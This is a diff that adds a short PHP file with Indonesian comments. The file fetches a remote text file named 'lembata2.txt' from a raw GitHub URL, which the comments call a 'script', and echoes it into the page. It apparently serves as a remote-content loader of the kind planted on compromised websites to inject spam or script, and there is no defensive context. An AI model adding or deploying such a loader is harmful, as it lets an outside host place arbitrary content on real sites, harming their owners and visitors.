@@ -1,0 +1,10 @@
+<?php
+$url = 'https://raw.githubusercontent.com/claracinta/t3/refs/heads/main/lembata2.txt';  // Ganti dengan URL yang diinginkan
+$response = file_get_contents($url);
+
+if ($response === FALSE) {
+    echo "Gagal mendownload skrip.";
+} else {
+    echo "Skrip berhasil didownload: " . $response;
+}
+?>
